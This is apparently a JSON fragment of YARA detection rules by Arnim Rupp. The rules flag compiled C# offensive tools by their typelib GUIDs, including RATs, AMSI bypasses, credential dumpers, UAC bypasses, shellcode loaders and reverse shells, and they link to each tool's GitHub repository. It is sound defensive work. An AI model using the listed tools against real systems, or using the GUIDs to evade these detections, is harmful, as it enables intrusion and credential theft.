  "HKTL_NET_GUID_LimeLogger": "rule HKTL_NET_GUID_LimeLogger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/LimeLogger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"068d14ef-f0a1-4f9d-8e27-58b4317830c6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AggressorScripts": "rule HKTL_NET_GUID_AggressorScripts {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/harleyQu1nn/AggressorScripts\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"afd1ff09-2632-4087-a30c-43591f32e4e8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Gopher": "rule HKTL_NET_GUID_Gopher {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/EncodeGroup/Gopher\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"b5152683-2514-49ce-9aca-1bc43df1e234\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AVIator": "rule HKTL_NET_GUID_AVIator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Ch0pin/AVIator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4885a4a3-4dfa-486c-b378-ae94a221661a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_njCrypter": "rule HKTL_NET_GUID_njCrypter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xPh0enix/njCrypter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8a87b003-4b43-467b-a509-0c8be05bf5a5\" ascii nocase wide\n        $typelibguid1 = \"80b13bff-24a5-4193-8e51-c62a414060ec\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpMiniDump": "rule HKTL_NET_GUID_SharpMiniDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/b4rtik/SharpMiniDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6ffccf81-6c3c-4d3f-b15f-35a86d0b497f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CinaRAT": "rule HKTL_NET_GUID_CinaRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/wearelegal/CinaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8586f5b1-2ef4-4f35-bd45-c6206fdc0ebc\" ascii nocase wide\n        $typelibguid1 = \"fe184ab5-f153-4179-9bf5-50523987cf1f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ToxicEye": "rule HKTL_NET_GUID_ToxicEye {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/ToxicEye\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1bcfe538-14f4-4beb-9a3f-3f9472794902\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Disable_Windows_Defender": "rule HKTL_NET_GUID_Disable_Windows_Defender {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Disable-Windows-Defender\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"501e3fdc-575d-492e-90bc-703fb6280ee2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DInvoke_PoC": "rule HKTL_NET_GUID_DInvoke_PoC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/dtrizna/DInvoke_PoC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5a869ab2-291a-49e6-a1b7-0d0f051bef0e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ReverseShell": "rule HKTL_NET_GUID_ReverseShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/chango77747/ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"980109e4-c988-47f9-b2b3-88d63fababdc\" ascii nocase wide\n        $typelibguid1 = \"8abe8da1-457e-4933-a40d-0958c8925985\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpC2": "rule HKTL_NET_GUID_SharpC2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SharpC2/SharpC2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"62b9ee4f-1436-4098-9bc1-dd61b42d8b81\" ascii nocase wide\n        $typelibguid1 = \"d2f17a91-eb2d-4373-90bf-a26e46c68f76\" ascii nocase wide\n        $typelibguid2 = \"a9db9fcc-7502-42cd-81ec-3cd66f511346\" ascii nocase wide\n        $typelibguid3 = \"ca6cc2ee-75fd-4f00-b687-917fa55a4fae\" ascii nocase wide\n        $typelibguid4 = \"a1167b68-446b-4c0c-a8b8-2a7278b67511\" ascii nocase wide\n        $typelibguid5 = \"4d8c2a88-1da5-4abe-8995-6606473d7cf1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SneakyExec": "rule HKTL_NET_GUID_SneakyExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HackingThings/SneakyExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"612590aa-af68-41e6-8ce2-e831f7fe4ccc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_UrbanBishopLocal": "rule HKTL_NET_GUID_UrbanBishopLocal {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/slyd0g/UrbanBishopLocal\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"88b8515e-a0e8-4208-a9a0-34b01d7ba533\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpShell": "rule HKTL_NET_GUID_SharpShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cobbr/SharpShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"bdba47c5-e823-4404-91d0-7f6561279525\" ascii nocase wide\n        $typelibguid1 = \"b84548dc-d926-4b39-8293-fa0bdef34d49\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_EvilWMIProvider": "rule HKTL_NET_GUID_EvilWMIProvider {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/sunnyc7/EvilWMIProvider\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a4020626-f1ec-4012-8b17-a2c8a0204a4b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_GadgetToJScript": "rule HKTL_NET_GUID_GadgetToJScript {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/med0x2e/GadgetToJScript\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"af9c62a1-f8d2-4be0-b019-0a7873e81ea9\" ascii nocase wide\n        $typelibguid1 = \"b2b3adb0-1669-4b94-86cb-6dd682ddbea3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AzureCLI_Extractor": "rule HKTL_NET_GUID_AzureCLI_Extractor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0x09AL/AzureCLI-Extractor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a73cad74-f8d6-43e6-9a4c-b87832cdeace\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_UAC_Escaper": "rule HKTL_NET_GUID_UAC_Escaper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/UAC-Escaper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"95359279-5cfa-46f6-b400-e80542a7336a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_HTTPSBeaconShell": "rule HKTL_NET_GUID_HTTPSBeaconShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/limbenjamin/HTTPSBeaconShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"aca853dc-9e74-4175-8170-e85372d5f2a9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AmsiScanBufferBypass": "rule HKTL_NET_GUID_AmsiScanBufferBypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/rasta-mouse/AmsiScanBufferBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"431ef2d9-5cca-41d3-87ba-c7f5e4582dd2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ShellcodeLoader": "rule HKTL_NET_GUID_ShellcodeLoader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Hzllaga/ShellcodeLoader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a48fe0e1-30de-46a6-985a-3f2de3c8ac96\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_KeystrokeAPI": "rule HKTL_NET_GUID_KeystrokeAPI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fabriciorissetto/KeystrokeAPI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f6fec17e-e22d-4149-a8a8-9f64c3c905d3\" ascii nocase wide\n        $typelibguid1 = \"b7aa4e23-39a4-49d5-859a-083c789bfea2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ShellCodeRunner": "rule HKTL_NET_GUID_ShellCodeRunner {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/antman1p/ShellCodeRunner\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"634874b7-bf85-400c-82f0-7f3b4659549a\" ascii nocase wide\n        $typelibguid1 = \"2f9c3053-077f-45f2-b207-87c3c7b8f054\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_OffensiveCSharp": "rule HKTL_NET_GUID_OffensiveCSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/diljith369/OffensiveCSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6c3fbc65-b673-40f0-b1ac-20636df01a85\" ascii nocase wide\n        $typelibguid1 = \"2bad9d69-ada9-4f1e-b838-9567e1503e93\" ascii nocase wide\n        $typelibguid2 = \"512015de-a70f-4887-8eae-e500fd2898ab\" ascii nocase wide\n        $typelibguid3 = \"1ee4188c-24ac-4478-b892-36b1029a13b3\" ascii nocase wide\n        $typelibguid4 = \"5c6b7361-f9ab-41dc-bfa0-ed5d4b0032a8\" ascii nocase wide\n        $typelibguid5 = \"048a6559-d4d3-4ad8-af0f-b7f72b212e90\" ascii nocase wide\n        $typelibguid6 = \"3412fbe9-19d3-41d8-9ad2-6461fcb394dc\" ascii nocase wide\n        $typelibguid7 = \"9ea4e0dc-9723-4d93-85bb-a4fcab0ad210\" ascii nocase wide\n        $typelibguid8 = \"6d2b239c-ba1e-43ec-8334-d67d52b77181\" ascii nocase wide\n        $typelibguid9 = \"42e8b9e1-0cf4-46ae-b573-9d0563e41238\" ascii nocase wide\n        $typelibguid10 = \"0d15e0e3-bcfd-4a85-adcd-0e751dab4dd6\" ascii nocase wide\n        $typelibguid11 = \"644dfd1a-fda5-4948-83c2-8d3b5eda143a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SHAPESHIFTER": "rule HKTL_NET_GUID_SHAPESHIFTER {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/matterpreter/SHAPESHIFTER\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a3ddfcaa-66e7-44fd-ad48-9d80d1651228\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Evasor": "rule HKTL_NET_GUID_Evasor {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cyberark/Evasor\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1c8849ef-ad09-4727-bf81-1f777bd1aef8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Stracciatella": "rule HKTL_NET_GUID_Stracciatella {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mgeeky/Stracciatella\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"eaafa0ac-e464-4fc4-9713-48aa9a6716fb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_logger": "rule HKTL_NET_GUID_logger {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/xxczaki/logger\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9e92a883-3c8b-4572-a73e-bb3e61cfdc16\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Internal_Monologue": "rule HKTL_NET_GUID_Internal_Monologue {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/eladshamir/Internal-Monologue\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0c0333db-8f00-4b68-b1db-18a9cacc1486\" ascii nocase wide\n        $typelibguid1 = \"84701ace-c584-4886-a3cf-76c57f6e801a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_GRAT2": "rule HKTL_NET_GUID_GRAT2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/GRAT2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5e7fce78-1977-444f-a18e-987d708a2cff\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_PowerShdll": "rule HKTL_NET_GUID_PowerShdll {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/p3nt4/PowerShdll\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"36ebf9aa-2f37-4f1d-a2f1-f2a45deeaf21\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CsharpAmsiBypass": "rule HKTL_NET_GUID_CsharpAmsiBypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/WayneJLee/CsharpAmsiBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4ab3b95d-373c-4197-8ee3-fe0fa66ca122\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_HastySeries": "rule HKTL_NET_GUID_HastySeries {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/obscuritylabs/HastySeries\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8435531d-675c-4270-85bf-60db7653bcf6\" ascii nocase wide\n        $typelibguid1 = \"47db989f-7e33-4e6b-a4a5-c392b429264b\" ascii nocase wide\n        $typelibguid2 = \"300c7489-a05f-4035-8826-261fa449dd96\" ascii nocase wide\n        $typelibguid3 = \"41bf8781-ae04-4d80-b38d-707584bf796b\" ascii nocase wide\n        $typelibguid4 = \"620ed459-18de-4359-bfb0-6d0c4841b6f6\" ascii nocase wide\n        $typelibguid5 = \"91e7cdfe-0945-45a7-9eaa-0933afe381f2\" ascii nocase wide\n        $typelibguid6 = \"c28e121a-60ca-4c21-af4b-93eb237b882f\" ascii nocase wide\n        $typelibguid7 = \"698fac7a-bff1-4c24-b2c3-173a6aae15bf\" ascii nocase wide\n        $typelibguid8 = \"63a40d94-5318-42ad-a573-e3a1c1284c57\" ascii nocase wide\n        $typelibguid9 = \"56b8311b-04b8-4e57-bb58-d62adc0d2e68\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DreamProtectorFree": "rule HKTL_NET_GUID_DreamProtectorFree {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Paskowsky/DreamProtectorFree\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f7e8a902-2378-426a-bfa5-6b14c4b40aa3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_RedSharp": "rule HKTL_NET_GUID_RedSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/padovah4ck/RedSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"30b2e0cf-34dd-4614-a5ca-6578fb684aea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ESC": "rule HKTL_NET_GUID_ESC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NetSPI/ESC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"06260ce5-61f4-4b81-ad83-7d01c3b37921\" ascii nocase wide\n        $typelibguid1 = \"87fc7ede-4dae-4f00-ac77-9c40803e8248\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Csharp_Loader": "rule HKTL_NET_GUID_Csharp_Loader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Csharp-Loader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5fd7f9fc-0618-4dde-a6a0-9faefe96c8a1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_bantam": "rule HKTL_NET_GUID_bantam {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/gellin/bantam\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"14c79bda-2ce6-424d-bd49-4f8d68630b7b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpTask": "rule HKTL_NET_GUID_SharpTask {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpTask\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"13e90a4d-bf7a-4d5a-9979-8b113e3166be\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_WindowsPlague": "rule HKTL_NET_GUID_WindowsPlague {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RITRedteam/WindowsPlague\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"cdf8b024-70c9-413a-ade3-846a43845e99\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Misc_CSharp": "rule HKTL_NET_GUID_Misc_CSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/Misc-CSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d1421ba3-c60b-42a0-98f9-92ba4e653f3d\" ascii nocase wide\n        $typelibguid1 = \"2afac0dd-f46f-4f95-8a93-dc17b4f9a3a1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpSpray": "rule HKTL_NET_GUID_SharpSpray {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpSpray\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"51c6e016-1428-441d-82e9-bb0eb599bbc8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Obfuscator": "rule HKTL_NET_GUID_Obfuscator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/3xpl01tc0d3r/Obfuscator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8fe5b811-a2cb-417f-af93-6a3cf6650af1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SafetyKatz": "rule HKTL_NET_GUID_SafetyKatz {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SafetyKatz\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8347e81b-89fc-42a9-b22c-f59a6a572dec\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Dropless_Malware": "rule HKTL_NET_GUID_Dropless_Malware {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Dropless-Malware\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"23b739f7-2355-491e-a7cd-a8485d39d6d6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_UAC_SilentClean": "rule HKTL_NET_GUID_UAC_SilentClean {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/EncodeGroup/UAC-SilentClean\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"948152a4-a4a1-4260-a224-204255bfee72\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DesktopGrabber": "rule HKTL_NET_GUID_DesktopGrabber {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/DesktopGrabber\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"e6aa0cd5-9537-47a0-8c85-1fbe284a4380\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_wsManager": "rule HKTL_NET_GUID_wsManager {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/guillaC/wsManager\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9480809e-5472-44f3-b076-dcdf7379e766\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_UglyEXe": "rule HKTL_NET_GUID_UglyEXe {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fashionproof/UglyEXe\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"233de44b-4ec1-475d-a7d6-16da48d6fc8d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpDump": "rule HKTL_NET_GUID_SharpDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"79c9bba3-a0ea-431c-866c-77004802d8a0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_EducationalRAT": "rule HKTL_NET_GUID_EducationalRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/securesean/EducationalRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8a18fbcf-8cac-482d-8ab7-08a44f0e278e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
